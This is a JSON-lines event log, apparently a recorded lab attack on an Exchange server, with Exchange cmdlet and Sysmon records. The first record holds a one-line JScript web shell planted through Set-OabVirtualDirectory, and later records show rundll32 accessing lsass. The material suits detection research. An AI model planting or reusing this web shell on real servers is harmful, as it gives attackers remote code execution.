{"SourceName": "MSExchange CmdletLogs", "Level": "4", "Keywords": "0x80000000000000", "Channel": "MSExchange Management", "Hostname": "MXS01.azsentinel.local", "TimeCreated": "2021-03-14T01:40:12.987Z", "@timestamp": "2021-03-14T01:40:12.987Z", "EventID": 1, "Message": "Cmdlet suceeded. Cmdlet Set-OabVirtualDirectory, parameters -ExternalUrl \"http://ffff/#<script language=\"JScript\" runat=\"server\"> function Page_Load(){/**/eval(Request[\"code\"],\"unsafe\");}</script>\" -Identity \"OAB (Default Web Site)\".", "Task": "1"}
{"SourceName": "MSExchange CmdletLogs", "Level": "4", "Keywords": "0x80000000000000", "Channel": "MSExchange Management", "Hostname": "MXS01.azsentinel.local", "TimeCreated": "2021-03-14T01:40:14.768Z", "@timestamp": "2021-03-14T01:40:14.768Z", "EventID": 1, "Message": "Cmdlet suceeded. Cmdlet Remove-OabVirtualDirectory, parameters -Force \"True\" -Identity \"MXS01\\OAB (Default Web Site)\".", "Task": "1"}
{"SourceName": "MSExchange CmdletLogs", "Level": "4", "Keywords": "0x80000000000000", "Channel": "MSExchange Management", "Hostname": "MXS01.azsentinel.local", "TimeCreated": "2021-03-14T01:40:17.518Z", "@timestamp": "2021-03-14T01:40:17.518Z", "EventID": 1, "Message": "Cmdlet suceeded. Cmdlet New-OabVirtualDirectory, parameters -WebSiteName \"Default Web Site\" -Server \"MXS01\" -Role \"ClientAccess\" -InternalUrl \"https://mxs01.azsentinel.local/OAB\" -Path \"C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\OAB\".", "Task": "1"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "MXS01.azsentinel.local", "TimeCreated": "2021-03-14T01:39:35.481Z", "@timestamp": "2021-03-14T01:39:35.481Z", "EventID": 10, "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2021-03-14 06:39:35.468\r\nSourceProcessGUID: {6004D249-0959-604D-6219-000000000900}\r\nSourceProcessId: 5172\r\nSourceThreadId: 12492\r\nSourceImage: C:\\Windows\\system32\\rundll32.exe\r\nTargetProcessGUID: {6004D249-FD95-604C-0B00-000000000900}\r\nTargetProcessId: 812\r\nTargetImage: C:\\Windows\\system32\\lsass.exe\r\nGrantedAccess: 0x1400\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+a6084|C:\\Windows\\System32\\KERNELBASE.dll+221bd|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+c669|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+c71b|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2fde|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2b9e|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2659|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+1607|C:\\Windows\\system32\\mscoree.dll+1a755|C:\\Windows\\System32\\ADVAPI32.dll+12060|C:\\Windows\\System32\\ADVAPI32.dll+116b5|C:\\Windows\\System32\\KERNELBASE.dll+23d79|C:\\Windows\\System32\\KERNELBASE.dll+2332d|C:\\Windows\\system32\\pdh.dll+63ec|C:\\Windows\\system32\\pdh.dll+56ad|C:\\Windows\\system32\\pdh.dll+149a9|C:\\Windows\\system32\\pdh.dll+1b4fa|C:\\Windows\\system32\\pla.dll+faeff|C:\\Windows\\system32\\pla.dll+f23be|C:\\Windows\\System32\\KERNEL32.DLL+84d4|C:\\Windows\\SYSTEM32\\ntdll.dll+51821", "Task": "10", "RuleName": "-", "UtcTime": "2021-03-14 06:39:35.468", "SourceProcessGUID": "{6004D249-0959-604D-6219-000000000900}", "SourceProcessId": "5172", "SourceThreadId": "12492", "SourceImage": "C:\\Windows\\system32\\rundll32.exe", "TargetProcessGUID": "{6004D249-FD95-604C-0B00-000000000900}", "TargetProcessId": "812", "TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": "0x1400", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+a6084|C:\\Windows\\System32\\KERNELBASE.dll+221bd|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+c669|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+c71b|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2fde|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2b9e|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2659|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+1607|C:\\Windows\\system32\\mscoree.dll+1a755|C:\\Windows\\System32\\ADVAPI32.dll+12060|C:\\Windows\\System32\\ADVAPI32.dll+116b5|C:\\Windows\\System32\\KERNELBASE.dll+23d79|C:\\Windows\\System32\\KERNELBASE.dll+2332d|C:\\Windows\\system32\\pdh.dll+63ec|C:\\Windows\\system32\\pdh.dll+56ad|C:\\Windows\\system32\\pdh.dll+149a9|C:\\Windows\\system32\\pdh.dll+1b4fa|C:\\Windows\\system32\\pla.dll+faeff|C:\\Windows\\system32\\pla.dll+f23be|C:\\Windows\\System32\\KERNEL32.DLL+84d4|C:\\Windows\\SYSTEM32\\ntdll.dll+51821"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "MXS01.azsentinel.local", "TimeCreated": "2021-03-14T01:39:35.481Z", "@timestamp": "2021-03-14T01:39:35.481Z", "EventID": 10, "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2021-03-14 06:39:35.468\r\nSourceProcessGUID: {6004D249-0959-604D-6219-000000000900}\r\nSourceProcessId: 5172\r\nSourceThreadId: 12492\r\nSourceImage: C:\\Windows\\system32\\rundll32.exe\r\nTargetProcessGUID: {6004D249-FD95-604C-0B00-000000000900}\r\nTargetProcessId: 812\r\nTargetImage: C:\\Windows\\system32\\lsass.exe\r\nGrantedAccess: 0x1400\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+a6084|C:\\Windows\\System32\\KERNELBASE.dll+221bd|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+3b59|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+414d|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+d007|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+cb01|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2f5e|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+27fe|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+1607|C:\\Windows\\system32\\mscoree.dll+1a755|C:\\Windows\\System32\\ADVAPI32.dll+12060|C:\\Windows\\System32\\ADVAPI32.dll+116b5|C:\\Windows\\System32\\KERNELBASE.dll+23d79|C:\\Windows\\System32\\KERNELBASE.dll+2332d|C:\\Windows\\system32\\pdh.dll+63ec|C:\\Windows\\system32\\pdh.dll+56ad|C:\\Windows\\system32\\pdh.dll+149a9|C:\\Windows\\system32\\pdh.dll+1b4fa|C:\\Windows\\system32\\pla.dll+faeff|C:\\Windows\\system32\\pla.dll+f23be|C:\\Windows\\System32\\KERNEL32.DLL+84d4|C:\\Windows\\SYSTEM32\\ntdll.dll+51821", "Task": "10", "RuleName": "-", "UtcTime": "2021-03-14 06:39:35.468", "SourceProcessGUID": "{6004D249-0959-604D-6219-000000000900}", "SourceProcessId": "5172", "SourceThreadId": "12492", "SourceImage": "C:\\Windows\\system32\\rundll32.exe", "TargetProcessGUID": "{6004D249-FD95-604C-0B00-000000000900}", "TargetProcessId": "812", "TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": "0x1400", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+a6084|C:\\Windows\\System32\\KERNELBASE.dll+221bd|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+3b59|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+414d|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+d007|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+cb01|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2f5e|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+27fe|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+1607|C:\\Windows\\system32\\mscoree.dll+1a755|C:\\Windows\\System32\\ADVAPI32.dll+12060|C:\\Windows\\System32\\ADVAPI32.dll+116b5|C:\\Windows\\System32\\KERNELBASE.dll+23d79|C:\\Windows\\System32\\KERNELBASE.dll+2332d|C:\\Windows\\system32\\pdh.dll+63ec|C:\\Windows\\system32\\pdh.dll+56ad|C:\\Windows\\system32\\pdh.dll+149a9|C:\\Windows\\system32\\pdh.dll+1b4fa|C:\\Windows\\system32\\pla.dll+faeff|C:\\Windows\\system32\\pla.dll+f23be|C:\\Windows\\System32\\KERNEL32.DLL+84d4|C:\\Windows\\SYSTEM32\\ntdll.dll+51821"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "MXS01.azsentinel.local", "TimeCreated": "2021-03-14T01:39:39.830Z", "@timestamp": "2021-03-14T01:39:39.830Z", "EventID": 1, "Message": "Process Create:\r\nRuleName: -\r\nUtcTime: 2021-03-14 06:39:39.829\r\nProcessGuid: {6004D249-AFAB-604D-2327-000000000900}\r\nProcessId: 14420\r\nImage: C:\\Windows\\System32\\netsh.exe\r\nFileVersion: 10.0.14393.0 (rs1_release.160715-1616)\r\nDescription: Network Command Shell\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: netsh.exe\r\nCommandLine: \"netsh\" interface tcp show global\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {6004D249-FD95-604C-E703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: SHA1=DCB637AF92C54162721F1E84CA59D16603FEAB2C,MD5=4D51BCD0B94D09F5DFB80DF754D31E28,SHA256=E5888E649C881E4BBBCE472F6808F93B2B5564D3094995A5A08E66B2406C1607,IMPHASH=51DC8B92EF1620527201E5276E21BCA7\r\nParentProcessGuid: {6004D249-0957-604D-6019-000000000900}\r\nParentProcessId: 12252\r\nParentImage: C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Bin\\MSExchangeHMWorker.exe\r\nParentCommandLine: \"C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Bin\\MSExchangeHMWorker.exe\" -pipe:3208 -stopkey:Global\\ExchangeStopKey-badd286e-ad43-49a0-aca5-bcc52e53fcdf -resetkey:Global\\ExchangeResetKey-6132f488-89a0-492c-bd53-2b3203aa9dc7 -readykey:Global\\ExchangeReadyKey-a65f0a51-2af2-4538-88de-810b7c6ad185 -hangkey:Global\\ExchangeHangKey-ff03afc1-7bd6-4893-a565-21f9c2ca0b6b -startUpProgressKey:Global\\ExchangeProgressKey-b96b2cab-bf9e-4165-b65b-153634bb4965 -workerListening", "Task": "1", "RuleName": "-", "UtcTime": "2021-03-14 06:39:39.829", "ProcessGuid": "{6004D249-AFAB-604D-2327-000000000900}", "ProcessId": "14420", "Image": "C:\\Windows\\System32\\netsh.exe", "FileVersion": "10.0.14393.0 (rs1_release.160715-1616)", "Description": "Network Command Shell", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "netsh.exe", "CommandLine": "\"netsh\" interface tcp show global", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "NT AUTHORITY\\SYSTEM", "LogonGuid": "{6004D249-FD95-604C-E703-000000000000}", "LogonId": "0x3e7", "TerminalSessionId": "0", "IntegrityLevel": "System", "Hashes": "SHA1=DCB637AF92C54162721F1E84CA59D16603FEAB2C,MD5=4D51BCD0B94D09F5DFB80DF754D31E28,SHA256=E5888E649C881E4BBBCE472F6808F93B2B5564D3094995A5A08E66B2406C1607,IMPHASH=51DC8B92EF1620527201E5276E21BCA7", "ParentProcessGuid": "{6004D249-0957-604D-6019-000000000900}", "ParentProcessId": "12252", "ParentImage": "C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Bin\\MSExchangeHMWorker.exe", "ParentCommandLine": "\"C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Bin\\MSExchangeHMWorker.exe\" -pipe:3208 -stopkey:Global\\ExchangeStopKey-badd286e-ad43-49a0-aca5-bcc52e53fcdf -resetkey:Global\\ExchangeResetKey-6132f488-89a0-492c-bd53-2b3203aa9dc7 -readykey:Global\\ExchangeReadyKey-a65f0a51-2af2-4538-88de-810b7c6ad185 -hangkey:Global\\ExchangeHangKey-ff03afc1-7bd6-4893-a565-21f9c2ca0b6b -startUpProgressKey:Global\\ExchangeProgressKey-b96b2cab-bf9e-4165-b65b-153634bb4965 -workerListening"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "MXS01.azsentinel.local", "TimeCreated": "2021-03-14T01:39:50.499Z", "@timestamp": "2021-03-14T01:39:50.499Z", "EventID": 10, "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2021-03-14 06:39:50.485\r\nSourceProcessGUID: {6004D249-0959-604D-6219-000000000900}\r\nSourceProcessId: 5172\r\nSourceThreadId: 12492\r\nSourceImage: C:\\Windows\\system32\\rundll32.exe\r\nTargetProcessGUID: {6004D249-FD95-604C-0B00-000000000900}\r\nTargetProcessId: 812\r\nTargetImage: C:\\Windows\\system32\\lsass.exe\r\nGrantedAccess: 0x1400\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+a6084|C:\\Windows\\System32\\KERNELBASE.dll+221bd|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+c669|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+c71b|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2fde|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2b9e|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2659|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+1607|C:\\Windows\\system32\\mscoree.dll+1a755|C:\\Windows\\System32\\ADVAPI32.dll+12060|C:\\Windows\\System32\\ADVAPI32.dll+116b5|C:\\Windows\\System32\\KERNELBASE.dll+23d79|C:\\Windows\\System32\\KERNELBASE.dll+2332d|C:\\Windows\\system32\\pdh.dll+63ec|C:\\Windows\\system32\\pdh.dll+56ad|C:\\Windows\\system32\\pdh.dll+149a9|C:\\Windows\\system32\\pdh.dll+1b4fa|C:\\Windows\\system32\\pla.dll+faeff|C:\\Windows\\system32\\pla.dll+f23be|C:\\Windows\\System32\\KERNEL32.DLL+84d4|C:\\Windows\\SYSTEM32\\ntdll.dll+51821", "Task": "10", "RuleName": "-", "UtcTime": "2021-03-14 06:39:50.485", "SourceProcessGUID": "{6004D249-0959-604D-6219-000000000900}", "SourceProcessId": "5172", "SourceThreadId": "12492", "SourceImage": "C:\\Windows\\system32\\rundll32.exe", "TargetProcessGUID": "{6004D249-FD95-604C-0B00-000000000900}", "TargetProcessId": "812", "TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": "0x1400", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+a6084|C:\\Windows\\System32\\KERNELBASE.dll+221bd|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+c669|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+c71b|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2fde|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2b9e|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2659|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+1607|C:\\Windows\\system32\\mscoree.dll+1a755|C:\\Windows\\System32\\ADVAPI32.dll+12060|C:\\Windows\\System32\\ADVAPI32.dll+116b5|C:\\Windows\\System32\\KERNELBASE.dll+23d79|C:\\Windows\\System32\\KERNELBASE.dll+2332d|C:\\Windows\\system32\\pdh.dll+63ec|C:\\Windows\\system32\\pdh.dll+56ad|C:\\Windows\\system32\\pdh.dll+149a9|C:\\Windows\\system32\\pdh.dll+1b4fa|C:\\Windows\\system32\\pla.dll+faeff|C:\\Windows\\system32\\pla.dll+f23be|C:\\Windows\\System32\\KERNEL32.DLL+84d4|C:\\Windows\\SYSTEM32\\ntdll.dll+51821"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "MXS01.azsentinel.local", "TimeCreated": "2021-03-14T01:39:50.499Z", "@timestamp": "2021-03-14T01:39:50.499Z", "EventID": 10, "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2021-03-14 06:39:50.485\r\nSourceProcessGUID: {6004D249-0959-604D-6219-000000000900}\r\nSourceProcessId: 5172\r\nSourceThreadId: 12492\r\nSourceImage: C:\\Windows\\system32\\rundll32.exe\r\nTargetProcessGUID: {6004D249-FD95-604C-0B00-000000000900}\r\nTargetProcessId: 812\r\nTargetImage: C:\\Windows\\system32\\lsass.exe\r\nGrantedAccess: 0x1400\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+a6084|C:\\Windows\\System32\\KERNELBASE.dll+221bd|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+3b59|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+414d|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+d007|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+cb01|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2f5e|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+27fe|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+1607|C:\\Windows\\system32\\mscoree.dll+1a755|C:\\Windows\\System32\\ADVAPI32.dll+12060|C:\\Windows\\System32\\ADVAPI32.dll+116b5|C:\\Windows\\System32\\KERNELBASE.dll+23d79|C:\\Windows\\System32\\KERNELBASE.dll+2332d|C:\\Windows\\system32\\pdh.dll+63ec|C:\\Windows\\system32\\pdh.dll+56ad|C:\\Windows\\system32\\pdh.dll+149a9|C:\\Windows\\system32\\pdh.dll+1b4fa|C:\\Windows\\system32\\pla.dll+faeff|C:\\Windows\\system32\\pla.dll+f23be|C:\\Windows\\System32\\KERNEL32.DLL+84d4|C:\\Windows\\SYSTEM32\\ntdll.dll+51821", "Task": "10", "RuleName": "-", "UtcTime": "2021-03-14 06:39:50.485", "SourceProcessGUID": "{6004D249-0959-604D-6219-000000000900}", "SourceProcessId": "5172", "SourceThreadId": "12492", "SourceImage": "C:\\Windows\\system32\\rundll32.exe", "TargetProcessGUID": "{6004D249-FD95-604C-0B00-000000000900}", "TargetProcessId": "812", "TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": "0x1400", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+a6084|C:\\Windows\\System32\\KERNELBASE.dll+221bd|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+3b59|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+414d|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+d007|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+cb01|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+2f5e|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+27fe|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll+1607|C:\\Windows\\system32\\mscoree.dll+1a755|C:\\Windows\\System32\\ADVAPI32.dll+12060|C:\\Windows\\System32\\ADVAPI32.dll+116b5|C:\\Windows\\System32\\KERNELBASE.dll+23d79|C:\\Windows\\System32\\KERNELBASE.dll+2332d|C:\\Windows\\system32\\pdh.dll+63ec|C:\\Windows\\system32\\pdh.dll+56ad|C:\\Windows\\system32\\pdh.dll+149a9|C:\\Windows\\system32\\pdh.dll+1b4fa|C:\\Windows\\system32\\pla.dll+faeff|C:\\Windows\\system32\\pla.dll+f23be|C:\\Windows\\System32\\KERNEL32.DLL+84d4|C:\\Windows\\SYSTEM32\\ntdll.dll+51821"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "MXS01.azsentinel.local", "TimeCreated": "2021-03-14T01:39:52.019Z", "@timestamp": "2021-03-14T01:39:52.019Z", "EventID": 1, "Message": "Process Create:\r\nRuleName: -\r\nUtcTime: 2021-03-14 06:39:52.018\r\nProcessGuid: {6004D249-AFB8-604D-2427-000000000900}\r\nProcessId: 22240\r\nImage: C:\\Windows\\System32\\cscript.exe\r\nFileVersion: 5.812.10240.16384\r\nDescription: Microsoft \u00ae Console Based Script Host\r\nProduct: Microsoft \u00ae Windows Script Host\r\nCompany: Microsoft Corporation\r\nOriginalFileName: cscript.exe\r\nCommandLine: \"C:\\Windows\\system32\\cscript.exe\" /nologo \"MonitorKnowledgeDiscovery.vbs\"\r\nCurrentDirectory: C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\Health Service State\\Monitoring Host Temporary Files 2\\398\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {6004D249-FD95-604C-E703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: SHA1=024BE36DC724F7D9C7F9F509111C75F847E86664,MD5=8552F94CFD39A4C307BCD1BD88D41604,SHA256=6216383428EAB3292C5590C70D24B33A7D84FBF1C463E331C40F052E6EA356FE,IMPHASH=77838A7D26CC1C7050C41CF6165BAD0E\r\nParentProcessGuid: {6004D249-AC2E-604D-F126-000000000900}\r\nParentProcessId: 8368\r\nParentImage: C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\MonitoringHost.exe\r\nParentCommandLine: \"C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\MonitoringHost.exe\" -Embedding", "Task": "1", "RuleName": "-", "UtcTime": "2021-03-14 06:39:52.018", "ProcessGuid": "{6004D249-AFB8-604D-2427-000000000900}", "ProcessId": "22240", "Image": "C:\\Windows\\System32\\cscript.exe", "FileVersion": "5.812.10240.16384", "Description": "Microsoft \u00ae Console Based Script Host", "Product": "Microsoft \u00ae Windows Script Host", "Company": "Microsoft Corporation", "OriginalFileName": "cscript.exe", "CommandLine": "\"C:\\Windows\\system32\\cscript.exe\" /nologo \"MonitorKnowledgeDiscovery.vbs\"", "CurrentDirectory": "C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\Health Service State\\Monitoring Host Temporary Files 2\\398\\", "User": "NT AUTHORITY\\SYSTEM", "LogonGuid": "{6004D249-FD95-604C-E703-000000000000}", "LogonId": "0x3e7", "TerminalSessionId": "0", "IntegrityLevel": "System", "Hashes": "SHA1=024BE36DC724F7D9C7F9F509111C75F847E86664,MD5=8552F94CFD39A4C307BCD1BD88D41604,SHA256=6216383428EAB3292C5590C70D24B33A7D84FBF1C463E331C40F052E6EA356FE,IMPHASH=77838A7D26CC1C7050C41CF6165BAD0E", "ParentProcessGuid": "{6004D249-AC2E-604D-F126-000000000900}", "ParentProcessId": "8368", "ParentImage": "C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\MonitoringHost.exe", "ParentCommandLine": "\"C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\MonitoringHost.exe\" -Embedding"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "MXS01.azsentinel.local", "TimeCreated": "2021-03-14T01:39:52.023Z", "@timestamp": "2021-03-14T01:39:52.023Z", "EventID": 1, "Message": "Process Create:\r\nRuleName: -\r\nUtcTime: 2021-03-14 06:39:52.022\r\nProcessGuid: {6004D249-AFB8-604D-2527-000000000900}\r\nProcessId: 26252\r\nImage: C:\\Windows\\System32\\conhost.exe\r\nFileVersion: 10.0.14393.0 (rs1_release.160715-1616)\r\nDescription: Console Window Host\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: CONHOST.EXE\r\nCommandLine: \\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1\r\nCurrentDirectory: C:\\Windows\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {6004D249-FD95-604C-E703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354,MD5=D752C96401E2540A443C599154FC6FA9,SHA256=046F7A1B4DE67562547ED9A180A72F481FC41E803DE49A96D7D7C731964D53A0,IMPHASH=2C980A4DA7C717CC670CB9E1D2C4D733\r\nParentProcessGuid: {6004D249-AFB8-604D-2427-000000000900}\r\nParentProcessId: 22240\r\nParentImage: C:\\Windows\\System32\\cscript.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cscript.exe\" /nologo \"MonitorKnowledgeDiscovery.vbs\"", "Task": "1", "RuleName": "-", "UtcTime": "2021-03-14 06:39:52.022", "ProcessGuid": "{6004D249-AFB8-604D-2527-000000000900}", "ProcessId": "26252", "Image": "C:\\Windows\\System32\\conhost.exe", "FileVersion": "10.0.14393.0 (rs1_release.160715-1616)", "Description": "Console Window Host", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "CONHOST.EXE", "CommandLine": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1", "CurrentDirectory": "C:\\Windows", "User": "NT AUTHORITY\\SYSTEM", "LogonGuid": "{6004D249-FD95-604C-E703-000000000000}", "LogonId": "0x3e7", "TerminalSessionId": "0", "IntegrityLevel": "System", "Hashes": "SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354,MD5=D752C96401E2540A443C599154FC6FA9,SHA256=046F7A1B4DE67562547ED9A180A72F481FC41E803DE49A96D7D7C731964D53A0,IMPHASH=2C980A4DA7C717CC670CB9E1D2C4D733", "ParentProcessGuid": "{6004D249-AFB8-604D-2427-000000000900}", "ParentProcessId": "22240", "ParentImage": "C:\\Windows\\System32\\cscript.exe", "ParentCommandLine": "\"C:\\Windows\\system32\\cscript.exe\" /nologo \"MonitorKnowledgeDiscovery.vbs\""}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "MXS01.azsentinel.local", "TimeCreated": "2021-03-14T01:40:05.500Z", "@timestamp": "2021-03-14T01:40:05.500Z", "EventID": 10, "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2021-03-14 06:40:05.486\r\nSourceProcessGUID: {6004D249-0959-604D-6219-000000000900}\r\nSourceProcessId: 5172\r\nSourceThreadId: 12492\r\nSourceImage: C:\\Windows\\system32\\rundll32.exe\r\nTargetProcessGUID: {6004D249-FD95-604C-0B00-000000000900}\r\nTargetProcessId: 812\r\nTargetImage: C:\\Windows\\system32\\lsass.exe\r\nGrantedAccess: 0x1400\r\nCallTrace: 